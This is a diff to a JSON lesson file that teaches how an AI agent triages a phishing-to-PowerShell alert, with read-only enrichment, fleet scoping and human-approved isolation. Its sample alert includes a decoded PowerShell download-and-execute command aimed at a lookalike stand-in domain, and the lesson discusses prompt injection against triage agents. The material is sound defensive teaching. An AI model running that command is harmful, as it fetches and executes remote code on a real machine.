@@ -6,6 +6,44 @@
   "category": "Cybersecurity automation",
   "title": "AI alert triage in the SOC",
   "summary": "Security teams drown in alerts. An agent gathers evidence for each one so analysts only see what matters.",
+  "seoTitle": "AI alert triage in the SOC: how an agent investigates an alert",
+  "seoDescription": "Follow an AI triage agent as it decodes a suspicious PowerShell alert, enriches it, scopes the fleet and hands an analyst a ready-made case with evidence.",
+  "objectives": [
+    "Explain what alert triage is and why it is the bottleneck in most security operations centres.",
+    "Trace how an AI agent enriches an alert with threat intelligence, host context and fleet-wide scoping before giving a verdict.",
+    "Decide which triage steps are safe to automate and which must stay with a human analyst."
+  ],
+  "lastVerified": "2026-11-19",
+  "sources": [
+    {
+      "title": "MITRE ATT&CK T1059.001: Command and Scripting Interpreter, PowerShell",
+      "url": "https://attack.mitre.org/techniques/T1059/001/"
+    },
+    {
+      "title": "MITRE ATT&CK T1027.010: Obfuscated Files or Information, Command Obfuscation",
+      "url": "https://attack.mitre.org/techniques/T1027/010/"
+    },
+    {
+      "title": "MITRE ATT&CK T1105: Ingress Tool Transfer",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+    },
+    {
+      "title": "MITRE ATT&CK T1204.002: User Execution, Malicious File",
+      "url": "https://attack.mitre.org/techniques/T1204/002/"
+    },
+    {
+      "title": "MITRE ATT&CK T1566.001: Phishing, Spearphishing Attachment",
+      "url": "https://attack.mitre.org/techniques/T1566/001/"
+    },
+    {
+      "title": "NIST SP 800-61 Rev. 3: Incident Response Recommendations",
+      "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final"
+    },
+    {
+      "title": "CISA: Federal Government Cybersecurity Incident and Vulnerability Response Playbooks",
+      "url": "https://www.cisa.gov/resources-tools/resources/federal-government-cybersecurity-incident-and-vulnerability-response-playbooks"
+    }
+  ],
   "nodes": [
     {
       "id": "siem",
@@ -54,24 +92,43 @@
         [
           "rule",
           "\"Suspicious PowerShell download\"",
-          ""
+          "The detection rule that matched. Its name is a hint, not a verdict."
         ],
         [
           "host",
           "FIN-LAPTOP-22",
-          ""
+          "The machine where it happened, so the agent can look up its owner and importance."
+        ],
+        [
+          "parent",
+          "WINWORD.EXE",
+          "The program that launched PowerShell. A word processor starting a script engine is unusual."
         ],
         [
           "command",
           "powershell -enc SQBFAFgA…",
-          "Encoded commands are a common way to hide intent."
+          "An encoded command. Attackers encode commands to hide what they do from casual reading."
         ],
         [
           "severity",
           "high",
-          ""
+          "Set by the rule author. Useful for ordering the queue, but rules are often noisy."
         ]
-      ]
+      ],
+      "depth": {
+        "beginner": "A security alarm goes off. The company's central log system, called a SIEM, has spotted something odd on a finance laptop: Microsoft Word started PowerShell, a powerful built-in tool for running commands, and gave it a scrambled instruction. Big organisations get thousands of alerts like this every day, and most turn out to be harmless. Deciding which ones are real is called triage, and it is where analysts spend much of their time.",
+        "practitioner": "A detection rule matched a process event: `WINWORD.EXE` spawning `powershell.exe` with `-enc`, which takes a Base64-encoded command. Office applications spawning script interpreters is a classic sign of a malicious document (ATT&CK T1204.002 user execution of a malicious file). The alert reaches the triage agent with the raw fields. The goal is not to trust the severity label but to gather evidence quickly and produce a verdict a human can check.",
+        "expert": "Treat every alert field as attacker-influenced: command lines, file names and document titles are chosen by whoever ran them, so they are a prompt-injection surface for an AI agent. Pass them as clearly labelled data. Include environment context with the alert, such as asset criticality, the owner's role and known-good software, because the same process tree can be malicious on one host and an approved macro on another."
+      },
+      "walk": {
+        "why": "Alerts are cheap to generate and expensive to investigate. Automating the first pass means humans start from evidence instead of from a raw log line.",
+        "wrong": "Severity labels mislead: noisy \"high\" rules hide real \"medium\" ones. Alert fields can also contain text written to steer an AI that reads them.",
+        "example": "Many security teams receive more daily alerts than their analysts can open, so low-priority queues are often never reviewed at all."
+      },
+      "predict": {
+        "question": "Word started PowerShell with an encoded command. What should the agent do first: isolate the laptop, or find out what the command actually does?",
+        "reveal": "Find out what it does. Decoding and enriching are read-only and fast; isolation disrupts a person's work and should wait for evidence and a human decision."
+      }
     },
     {
       "from": "agent",
@@ -83,19 +140,34 @@
         [
           "decoded",
           "IEX (New-Object Net.WebClient).DownloadString('http://cdn-upd4te.example/a.ps1')",
-          "Downloads and runs a script."
+          "Downloads a script and runs it in memory without saving a file (ATT&CK T1105 and T1059.001)."
         ],
         [
           "domain",
           "cdn-upd4te.example",
-          ""
+          "The indicator extracted for lookup. Note the lookalike spelling of \"update\"."
         ],
         [
           "intel",
-          "registered 3 days ago · on 2 blocklists",
-          "Strong red flags."
+          "first seen 3 days ago · listed by 2 feeds",
+          "Illustrative enrichment. Newly registered, already-listed domains are strong red flags."
+        ],
+        [
+          "technique",
+          "T1027.010 command obfuscation",
+          "Encoding the command is itself a technique worth recording."
         ]
-      ]
+      ],
+      "depth": {
+        "beginner": "First the agent unscrambles the instruction. It turns out to say: \"download a script from a website and run it immediately\". The website's name, cdn-upd4te.example, is a lookalike made to resemble a normal update server. The agent checks that name against threat-intelligence lists, which are shared lists of known bad websites and files. The site was created only days ago and is already listed as malicious.",
+        "practitioner": "`-enc` takes Base64 of UTF-16LE text, so decoding is deterministic and should be done by code, not by the model guessing. The decoded command uses `IEX` with `DownloadString`, a download-and-execute pattern (T1105, T1059.001). The agent extracts indicators (domains, IPs, URLs, hashes) into structured fields and queries reputation sources in parallel. These lookups are read-only, so they run without approval.",
+        "expert": "Treat reputation as one signal: brand-new domains may simply be unknown, and shared hosting can taint innocent sites. Record source, timestamp and confidence for each lookup so verdicts are reproducible. Watch for indicator lookups leaking sensitive data: sending internal hostnames or full URLs with tokens to a third-party service can expose them, so strip query strings and use private intel where required."
+      },
+      "walk": {
+        "why": "Known-bad matches settle many cases in seconds, and decoding hidden commands shows intent that the raw alert obscured.",
+        "wrong": "Letting the model \"decode\" Base64 by itself can produce plausible but wrong text. Unknown is not the same as safe; attackers rotate fresh domains constantly.",
+        "example": "Analysts routinely paste encoded PowerShell into a decoder before anything else; the agent simply does it instantly and records the result."
+      }
     },
     {
       "from": "agent",
@@ -105,21 +177,74 @@
       "text": "Read-only queries to the endpoint tool: parent process, network connections, other alerts on this host.",
       "payload": [
         [
-          "parent",
-          "WINWORD.EXE → powershell.exe",
-          "Word launching PowerShell usually means a malicious document."
+          "process tree",
+          "OUTLOOK.EXE → WINWORD.EXE → powershell.exe",
+          "Shows the chain: an email attachment opened in Word, which then ran PowerShell."
+        ],
+        [
+          "document",
+          "Invoice_Q3.docm",
+          "A macro-enabled document (.docm), consistent with a malicious attachment (T1566.001)."
         ],
         [
           "user",
           "a.khan (finance)",
-          ""
+          "Who was logged in. Finance staff are frequent phishing targets."
         ],
         [
-          "outbound",
-          "443 → 203.0.113.50",
-          ""
+          "network",
+          "TLS to 203.0.113.50:443 at 09:02:14",
+          "An outbound connection seconds after the command ran, likely the script download."
         ]
-      ]
+      ],
+      "depth": {
+        "beginner": "Next the agent asks the security software on that laptop, called EDR, what else happened around the same time. The answer fills in the story: the user opened an email attachment called Invoice_Q3, Word ran a hidden macro, the macro started PowerShell, and the laptop immediately connected to an outside server. Each fact on its own might be innocent. Together they look like a classic phishing attack.",
+        "practitioner": "The EDR API returns the process tree, the opened file and network activity in a time window around the alert. A macro-enabled document from email spawning PowerShell, followed by an outbound connection, matches spearphishing with an attachment (T1566.001) leading to user execution (T1204.002). All of these queries are read-only and scoped to one host and a short time window.",
+        "expert": "Prefer curated, parameterised tool calls such as `get_process_tree(host, time_window)` over free-form queries; they are easier to validate and cheaper to run. Capture raw responses alongside the summary for the case file. Correlate on host and user rather than only on time, because clocks drift and some EDR events arrive late."
+      },
+      "walk": {
+        "why": "Context turns a single suspicious event into a story with a beginning (email), middle (macro) and end (network call), which is what a verdict needs.",
+        "wrong": "Over-wide time windows pull in unrelated activity, and late-arriving telemetry can make the agent conclude nothing else happened when the data simply has not arrived yet.",
+        "example": "Incident write-ups often show exactly this chain: an invoice-themed document from email, a macro, a script interpreter and an outbound download."
+      }
+    },
+    {
+      "from": "agent",
+      "to": "siem",
+      "label": "scope fleet",
+      "title": "Scope: has this happened anywhere else?",
+      "text": "Before giving a verdict, the agent searches the whole fleet for the same domain, file and email.",
+      "payload": [
+        [
+          "query",
+          "domain = cdn-upd4te.example OR file = Invoice_Q3.docm, last 7 days",
+          "A read-only fleet-wide search for the same indicators."
+        ],
+        [
+          "hosts",
+          "1 (FIN-LAPTOP-22)",
+          "Illustrative result: only this machine connected to the domain."
+        ],
+        [
+          "mailboxes",
+          "6 received the same attachment",
+          "Illustrative: others got the email but have not opened it yet, which shapes the response."
+        ]
+      ],
+      "depth": {
+        "beginner": "One infected laptop could be the tip of an iceberg, so the agent checks the whole company. It searches every computer's records for the same bad website and the same attachment. Only this one laptop contacted the website, but six other people received the same email and have not opened it yet. That is useful: the team can remove those emails before anyone else clicks.",
+        "practitioner": "Scoping answers \"how big is this?\" and drives the response plan. The agent pivots on each indicator (domain, attachment hash, sender) across endpoint, proxy and email logs. Results feed two actions: containment for affected hosts and prevention for exposed users, such as purging the email from mailboxes.",
+        "expert": "Bound pivots carefully: fleet-wide searches over long periods can be slow and costly, so start narrow and widen if needed. Searching by a hash catches renamed files; searching by name catches re-packed variants of the same lure. Record negative results too, since \"no other host contacted the domain\" is evidence the analyst needs."
+      },
+      "walk": {
+        "why": "Containing one laptop while the same email sits in six inboxes leaves the door open. Scoping turns a single alert into a complete response.",
+        "wrong": "Skipping scoping is a common reason incidents recur hours later. Searching only by file name misses copies saved under different names.",
+        "example": "Email security teams regularly purge a malicious message from every mailbox once one recipient reports or triggers it."
+      },
+      "predict": {
+        "question": "Only one laptop contacted the bad domain. Is the incident therefore limited to one machine?",
+        "reveal": "Not necessarily. Six more people received the same email and have not opened it yet. Scoping across email as well as endpoints shows the exposure, not just the current infection."
+      }
     },
     {
       "from": "agent",
@@ -130,39 +255,216 @@
       "payload": [
         [
           "verdict",
-          "likely true positive · confidence 0.92",
-          ""
+          "likely true positive · confidence 0.9",
+          "The agent's assessment. Confidence should be calibrated against past outcomes."
         ],
         [
           "ATT&CK",
-          "T1566.001 phishing attachment · T1059.001 PowerShell",
-          "Shared vocabulary for attacker behaviour."
+          "T1566.001 · T1204.002 · T1059.001 · T1027.010 · T1105",
+          "Shared vocabulary for what the attacker did, from delivery to download."
+        ],
+        [
+          "evidence",
+          "decoded command · process tree · intel hits · fleet scope",
+          "Each claim links to the raw tool output so the analyst can verify it."
         ],
         [
           "suggested",
-          "isolate host · reset user password · block domain",
-          ""
+          "isolate host · reset password · purge 6 emails · block domain",
+          "Proposed actions, tagged by risk; disruptive ones need approval."
         ]
-      ]
+      ],
+      "depth": {
+        "beginner": "The agent writes a short case file for a human analyst: what happened, how sure it is, the evidence, and what it recommends. Instead of a cryptic alert, the analyst gets a clear story they can check in a minute or two. The agent suggests cutting the laptop off the network, resetting the user's password, deleting the six unopened emails and blocking the bad website.",
+        "practitioner": "A consistent case format makes review fast and lets you measure the agent: verdict with confidence, timeline, ATT&CK mapping, evidence links and proposed actions tagged read-only, reversible or disruptive. Reversible steps such as blocking a domain may be pre-approved by policy; isolating a host and resetting credentials usually wait for a person.",
+        "expert": "Calibrate confidence: if past \"0.9\" verdicts were wrong a third of the time, the number misleads analysts. Ask the model to separate observed facts from inferences and to state what evidence would change its mind. Track analyst agreement rate, missed true positives and time to verdict per alert type before automating any decision."
+      },
+      "walk": {
+        "why": "Analysts review structured evidence far faster than they investigate from scratch, and a shared ATT&CK vocabulary makes cases comparable.",
+        "wrong": "Overconfident summaries invite rubber-stamping, and summaries without links to raw evidence cannot be checked.",
+        "example": "AI-assisted SOC tools commonly present a case summary and timeline beside the original alert so analysts can confirm or reject it quickly."
+      }
     },
     {
       "from": "analyst",
       "to": "edr",
       "label": "isolate host",
       "title": "The human pulls the trigger",
-      "text": "Containment can disrupt the business, so a person approves it. False positives get auto-closed with the agent's notes, saving hours a day.",
+      "text": "Containment can disrupt the business, so a person approves it. False positives get auto-closed with the agent's notes.",
       "payload": [
         [
           "action",
-          "network isolation",
-          ""
+          "network isolation of FIN-LAPTOP-22",
+          "Blocks traffic except the security console connection, so investigation can continue."
+        ],
+        [
+          "approved by",
+          "on-call analyst, 09:11",
+          "Recorded identity and time for the audit trail."
+        ],
+        [
+          "follow-up",
+          "password reset · email purge · domain block",
+          "The remaining approved actions, tracked in the case."
         ],
         [
           "time to triage",
-          "4 min (was ~45)",
-          ""
+          "about 9 minutes (illustrative)",
+          "Manual triage of a case like this commonly takes much longer."
         ]
-      ]
+      ],
+      "depth": {
+        "beginner": "The analyst reads the case, agrees, and approves isolating the laptop. The security software disconnects it from the network, except for a private line to the security team, so the attacker loses access but investigators do not. The other steps follow: a password reset and removing the six unopened emails. When the agent decides an alert is harmless instead, it closes it with notes so a person can audit those decisions too.",
+        "practitioner": "Approvals should be bound to exact parameters (this host, this action) and logged. Low-risk alert types where the agent has a measured track record can move to automatic closure with sampling: a person reviews a random share of auto-closed cases to catch drift. Disruptive actions stay behind approval, especially for servers and key staff.",
+        "expert": "Feed outcomes back: analyst overrides are labelled training and evaluation data for the triage agent. Watch for approval fatigue and for adversaries deliberately triggering many low-value alerts to bury a real one. NIST SP 800-61 Rev. 3 frames incident response within wider risk management; encode your decision authority, not just the technique."
+      },
+      "walk": {
+        "why": "Speed comes from the agent; accountability and business context come from the human. Isolation needs both.",
+        "wrong": "If every case needs approval, queues return; if approvals become automatic in practice, the safeguard is gone.",
+        "example": "Many teams let automation close known-benign alert types while keeping isolation of any production system strictly human-approved."
+      }
+    }
+  ],
+  "article": {
+    "promise": "See how an AI agent turns a cryptic security alert into an investigated case in minutes, and where a human must stay in charge.",
+    "thirtySeconds": [
+      "Alerts are cheap to raise and slow to investigate; triage decides which ones are real.",
+      "An AI agent decodes, enriches, gathers host context and scopes the fleet using read-only tools.",
+      "It hands the analyst a verdict with evidence and proposed actions; disruptive steps wait for approval."
+    ],
+    "whyItMatters": "Most security operations centres have more alerts than analysts. Real attacks hide among false alarms, and every hour of delay gives an attacker more time. AI triage can take the repetitive evidence-gathering off people's plates, but only if it is built to show its evidence, stay read-only until approved, and be measured against human decisions. This lesson shows that pattern on a realistic phishing-to-PowerShell alert.",
+    "analogy": "Think of a hospital triage nurse. They take vital signs, ask a few questions and check records before a doctor arrives, then hand over a clear summary. They do not perform surgery. The AI agent plays the nurse; the analyst is the doctor who decides on treatment.",
+    "audience": "SOC analysts and team leads, security engineers building automation, and managers evaluating AI-assisted detection and response.",
+    "minutes": 16,
+    "prerequisites": [
+      "tool-use",
+      "software-plus-ai-agents"
+    ],
+    "deepDives": [
+      {
+        "title": "What triage actually decides",
+        "body": "Triage answers three questions: is this real (true or false positive), how bad is it (scope and impact), and what should happen next. It does not fully investigate or remediate.\n\nKeeping that scope tight is what makes automation safe. The agent gathers evidence and recommends; it does not run the incident."
+      },
+      {
+        "title": "Decoding is code, not guessing",
+        "body": "PowerShell's `-EncodedCommand` (often shortened to `-enc`) takes Base64 of UTF-16LE text. Decoding is deterministic, so give the agent a decoding tool instead of letting the model guess.\n\nThe same rule applies to URL defanging, timestamp conversion and hash calculation: use code for exact transformations and the model for judgement."
+      },
+      {
+        "title": "Speaking ATT&CK",
+        "body": "MITRE ATT&CK is a public catalogue of attacker techniques with stable IDs such as T1059.001 for PowerShell. Mapping evidence to technique IDs lets analysts compare cases, find detection gaps and talk to other teams precisely.\n\nTechnique IDs describe behaviour, not malware families, so one case usually maps to several of them."
+      },
+      {
+        "title": "Triage with untrusted inputs",
+        "body": "An alert is partly written by the attacker: the command line, the document name and the domain were all chosen by them. When an AI agent reads those fields, they can contain text designed to change its behaviour.\n\nKeep alert content in a clearly labelled data section, give the triage agent read-only tools, and let code-level rules, not the model, decide which actions are even possible."
+      }
+    ],
+    "production": [
+      {
+        "title": "Prompt injection through alert fields",
+        "body": "Command lines, file names and email subjects are attacker-controlled. Wrap them as untrusted data, and never let alert content change which tools the agent may call."
+      },
+      {
+        "title": "Silent false negatives",
+        "body": "An agent that wrongly closes a real attack is worse than one that escalates too often. Sample auto-closed cases for human review and track missed true positives per alert type."
+      },
+      {
+        "title": "Data leaving through enrichment",
+        "body": "Looking up indicators with external services can leak internal hostnames, URLs with tokens or personal data. Strip sensitive parts and prefer private or self-hosted intelligence where required."
+      },
+      {
+        "title": "Cost and rate limits",
+        "body": "Every alert can trigger several model calls and tool queries. Batch similar alerts, cap tool calls per case, and keep noisy rules tuned so triage does not become the most expensive part of the SOC."
+      },
+      {
+        "title": "Drift between environments",
+        "body": "An agent tuned on one company's alerts can behave differently elsewhere because software, naming and normal behaviour differ. Re-evaluate on your own historical alerts before trusting it, and again after big changes such as a new EDR."
+      }
+    ],
+    "lab": {
+      "title": "Triage agent with risk-tagged tools",
+      "intro": "Use the reference triage agent: risk-tagged tools, argument validation, unknown-tool handling, approval for disruptive actions, hourly limits and an audit log, in Python and TypeScript with tests. Swap the scripted model for your own LLM client.",
+      "dir": "labs/security"
+    },
+    "takeaways": [
+      "Triage decides real or not, how bad, and what next; it is the main bottleneck in most SOCs.",
+      "Decode and extract indicators with code; use the model for judgement over the evidence.",
+      "Always scope the fleet before a verdict: one alert is often one symptom of a wider campaign.",
+      "Deliver cases with evidence links and calibrated confidence, mapped to ATT&CK techniques.",
+      "Keep disruptive actions behind recorded human approval and audit auto-closed cases."
+    ],
+    "faq": [
+      {
+        "q": "Can an AI agent close alerts on its own?",
+        "a": "It can for alert types where it has a measured track record, with a person reviewing a random sample of closures. Many teams start with recommend-only mode and widen automation per alert type."
+      },
+      {
+        "q": "What tools does a triage agent need?",
+        "a": "Read-only access to the SIEM, the EDR and threat-intelligence sources, plus exact helpers for decoding and indicator extraction. Response actions are separate tools behind approval."
+      },
+      {
+        "q": "How do I measure whether AI triage is working?",
+        "a": "Compare its verdicts with analyst decisions over time: agreement rate, missed true positives, false escalations and time to verdict, broken down by alert type."
+      },
+      {
+        "q": "Is this only for big companies?",
+        "a": "No. Small teams benefit most because they have the least analyst time, but they should start with read-only enrichment and summaries before any automated action."
+      },
+      {
+        "q": "What does the analyst still do if the agent does the triage?",
+        "a": "Analysts review verdicts, approve containment, handle unclear and high-impact cases, and improve detections and the agent itself based on what they see. Their time shifts from collecting evidence to making decisions."
+      }
+    ],
+    "related": [
+      "software-plus-ai-agents",
+      "phishing",
+      "incident-response",
+      "human-in-loop"
+    ]
+  },
+  "quiz": [
+    {
+      "q": "Why should the agent decode `-enc` PowerShell with a tool instead of letting the model read it?",
+      "options": [
+        "The model cannot read text",
+        "Decoding is deterministic; models can produce plausible but wrong output",
+        "Tools are always faster",
+        "Encoded commands are always safe"
+      ],
+      "answer": 1,
+      "explain": "Base64 decoding has one correct answer. Code gets it right every time; a model may hallucinate a plausible command."
+    },
+    {
+      "q": "Only one laptop contacted the bad domain, but six people received the email. What does scoping change?",
+      "options": [
+        "Nothing, only the laptop matters",
+        "The team can purge the email before others open it",
+        "All seven laptops should be isolated",
+        "The alert should be closed"
+      ],
+      "answer": 1,
+      "explain": "Scoping shows who is exposed. Removing the unopened emails prevents new infections without disrupting those users."
+    },
+    {
+      "q": "Which step should normally wait for a human?",
+      "options": [
+        "Looking up a domain's reputation",
+        "Reading the process tree",
+        "Isolating the laptop from the network",
+        "Mapping evidence to ATT&CK"
+      ],
+      "answer": 2,
+      "explain": "Isolation disrupts someone's work, so it is a disruptive action behind recorded approval. The others are read-only."
+    },
+    {
+      "q": "What is the main risk of letting the agent auto-close alerts with no review?",
+      "options": [
+        "Higher cost",
+        "Silent false negatives: real attacks closed as harmless",
+        "Slower triage",
+        "Too many tickets"
+      ],
+      "answer": 1,
+      "explain": "A wrongly closed real attack gives no further signal. Sampling closures for human review catches this drift."
     }
   ]
 }
